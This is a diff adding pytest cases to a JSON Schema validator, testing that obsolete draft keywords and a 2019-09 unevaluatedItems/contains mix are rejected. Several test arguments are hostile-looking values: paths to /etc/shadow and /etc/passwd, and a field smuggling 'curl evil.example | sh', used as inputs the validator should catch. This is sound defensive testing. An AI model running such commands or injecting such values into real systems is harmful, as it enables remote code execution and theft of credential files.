@@ -476,6 +476,200 @@ def test_contains_bounds_apply_from_2019_09():
     assert outcome(schema, {"to": ["all-staff", "all-staff"]}) == "arguments-invalid"
 
 
+DRAFT_2020 = "https://json-schema.org/draft/2020-12/schema"
+
+
+@pytest.mark.parametrize("dialect", [DRAFT_04, DRAFT_2020])
+@pytest.mark.parametrize(
+    ("constraint", "arguments"),
+    [
+        # Draft-03 assertions and applicators that no later draft defines.
+        ({"type": "integer", "divisibleBy": 2}, {"v": 3}),
+        ({"disallow": ["string"]}, {"v": "x"}),
+        ({"extends": {"type": "integer"}}, {"v": "x"}),
+        ({"type": "string", "extends": {"pattern": "^/srv/safe/"}}, {"v": "/etc/shadow"}),
+        # Draft-01 and draft-02 ones.
+        ({"requires": "confirm"}, {"v": 1}),
+        ({"minimum": 0, "minimumCanEqual": False}, {"v": 0}),
+        ({"maximum": 0, "maximumCanEqual": False}, {"v": 0}),
+        ({"maxDecimal": 0}, {"v": 1.5}),
+        ({"optional": False}, {}),
+    ],
+)
+def test_constraint_only_a_draft_before_draft_04_defines_makes_the_schema_invalid(
+    dialect, constraint, arguments
+):
+    # Each constraint was skipped as an annotation, which admitted these arguments.
+    schema = {"$schema": dialect, "type": "object", "properties": {"v": constraint}}
+    assert outcome(schema, arguments) == "schema-invalid"
+
+
+def test_retired_constraint_is_found_wherever_the_schema_applies_it():
+    schema = {
+        "type": "object",
+        "$defs": {"path": {"type": "string", "disallow": [{"pattern": "\\.\\."}]}},
+        "properties": {"path": {"allOf": [{"$ref": "#/$defs/path"}]}},
+    }
+    assert outcome(schema, {"path": "../../etc/passwd"}) == "schema-invalid"
+
+
+def test_retired_keyword_names_outside_constraint_positions_stay_valid():
+    schema = {
+        "type": "object",
+        "properties": {
+            "extends": {"type": "string", "default": {"divisibleBy": 2}},
+            "requires": {"type": "array", "items": {"enum": ["disallow", "maxDecimal"]}},
+            "note": {"type": "string", "optional": True},
+        },
+        "required": ["extends"],
+        "x-vendor": {"divisibleBy": 2, "optional": False},
+    }
+    assert outcome(schema, {"extends": "base", "requires": ["disallow"]}) == "valid"
+    assert outcome(schema, {"extends": "base", "note": 1}) == "arguments-invalid"
+    assert outcome(schema, {"requires": []}) == "arguments-invalid"
+
+
+def array_schema(constraints, extra=None, *, dialect=DRAFT_2019):
+    return {
+        "$schema": dialect,
+        "type": "object",
+        **(extra or {}),
+        "properties": {"l": {"type": "array", **constraints}},
+    }
+
+
+OK = {"const": "ok"}
+CONTAINS_DEF = {"$defs": {"c": {"contains": OK}}}
+
+
+@pytest.mark.parametrize(
+    ("schema", "arguments"),
+    [
+        (array_schema({"contains": OK, "unevaluatedItems": False}), {"l": ["ok"]}),
+        (
+            array_schema(
+                {
+                    "items": [{"type": "integer"}],
+                    "contains": {"type": "string"},
+                    "unevaluatedItems": False,
+                }
+            ),
+            {"l": [1, "foo"]},
+        ),
+        (array_schema({"contains": True, "unevaluatedItems": False}), {"l": [1]}),
+        (array_schema({"allOf": [{"contains": OK}], "unevaluatedItems": False}), {"l": ["ok"]}),
+        (array_schema({"anyOf": [{"contains": OK}], "unevaluatedItems": False}), {"l": ["ok"]}),
+        (array_schema({"oneOf": [{"contains": OK}], "unevaluatedItems": False}), {"l": ["ok"]}),
+        (array_schema({"if": {"contains": OK}, "unevaluatedItems": False}), {"l": ["ok"]}),
+        (
+            array_schema(
+                {"if": {"minItems": 1}, "then": {"contains": OK}, "unevaluatedItems": False}
+            ),
+            {"l": ["ok"]},
+        ),
+        (
+            array_schema(
+                {"if": {"minItems": 5}, "else": {"contains": OK}, "unevaluatedItems": False}
+            ),
+            {"l": ["ok"]},
+        ),
+        # Applied in place too, though jsonschema does not count them today.
+        (
+            array_schema({"not": {"contains": {"const": "x"}}, "unevaluatedItems": False}),
+            {"l": ["ok"]},
+        ),
+        (
+            array_schema({"dependentSchemas": {"x": {"contains": OK}}, "unevaluatedItems": False}),
+            {"l": ["ok"]},
+        ),
+        (
+            array_schema({"$ref": "#/$defs/c", "unevaluatedItems": False}, CONTAINS_DEF),
+            {"l": ["ok"]},
+        ),
+        (
+            array_schema(
+                {"allOf": [{"$ref": "#/$defs/c"}], "unevaluatedItems": False}, CONTAINS_DEF
+            ),
+            {"l": ["ok"]},
+        ),
+        (
+            array_schema(
+                {"$recursiveRef": "#", "unevaluatedItems": False},
+                {"type": ["object", "array"], "contains": OK},
+            ),
+            {"l": ["ok"]},
+        ),
+        # A satisfiable schema: an item that matches contains skipped the item constraint.
+        (
+            array_schema(
+                {
+                    "contains": {"type": "string", "pattern": "^ticket-"},
+                    "unevaluatedItems": {"type": "string", "pattern": "^[a-z0-9-]{1,32}$"},
+                }
+            ),
+            {"l": ["ticket-1; curl evil.example | sh #"]},
+        ),
+    ],
+)
+def test_2019_09_unevaluated_items_where_contains_applies_makes_the_schema_invalid(
+    schema, arguments
+):
+    # jsonschema counts the items that contains matched as evaluated, as 2020-12 does;
+    # 2019-09 contains makes no annotation, so the declared dialect rejects them.
+    assert outcome(schema, arguments) == "schema-invalid"
+
+
+def test_2019_09_unevaluated_items_without_contains_at_its_location_still_applies():
+    alone = array_schema({"items": [{"type": "integer"}], "unevaluatedItems": False})
+    assert outcome(alone, {"l": [1]}) == "valid"
+    assert outcome(alone, {"l": [1, "x"]}) == "arguments-invalid"
+    # contains below an item or on another property applies at another location.
+    elsewhere = array_schema(
+        {"items": [{"type": "array", "contains": OK}], "unevaluatedItems": False}
+    )
+    elsewhere["properties"]["tags"] = {"type": "array", "contains": OK}
+    assert outcome(elsewhere, {"l": [["ok"]], "tags": ["ok"]}) == "valid"
+    assert outcome(elsewhere, {"l": [["ok"], "ok"]}) == "arguments-invalid"
+    # A sibling's contains is not adjacent to unevaluatedItems in either dialect.
+    sibling = array_schema({"allOf": [{"contains": OK}, {"unevaluatedItems": False}]})
+    assert outcome(sibling, {"l": ["ok"]}) == "arguments-invalid"
+
+
+def test_2020_12_counts_contains_as_evaluated():
+    schema = array_schema({"contains": OK, "unevaluatedItems": False}, dialect=DRAFT_2020)
+    assert outcome(schema, {"l": ["ok"]}) == "valid"
+    assert outcome(schema, {"l": ["ok", "other"]}) == "arguments-invalid"
+
+
+def test_2019_09_contains_check_work_grows_linearly(monkeypatch):
+    from jsonschema import Draft201909Validator
+
+    resolved = []
+    reference_target = validation._reference_target
+
+    def counted(*args):
+        resolved.append(args)
+        return reference_target(*args)
+
+    monkeypatch.setattr(validation, "_reference_target", counted)
+
+    def work(length):
+        # A long chain of unevaluatedItems through references that no contains reaches.
+        defs = {
+            f"d{index}": {"$ref": f"#/$defs/d{index + 1}", "unevaluatedItems": False}
+            for index in range(length)
+        }
+        schema = {"$defs": {**defs, f"d{length}": {}, "c": {"contains": OK}}}
+        resolved.clear()
+        assert not validation._ignores_a_keyword(schema, DRAFT_2019, Draft201909Validator)
+        return len(resolved)
+
+    # At most one lookup per reference in the walk and one in the 2019-09 check.
+    small, large = work(1000), work(2000)
+    assert large == 2 * small
+    assert small <= 2 * 1000
+
+
 @pytest.mark.parametrize(
     ("bound", "keyword", "inside"),
     [("minimum", "exclusiveMinimum", 1), ("maximum", "exclusiveMaximum", -1)],
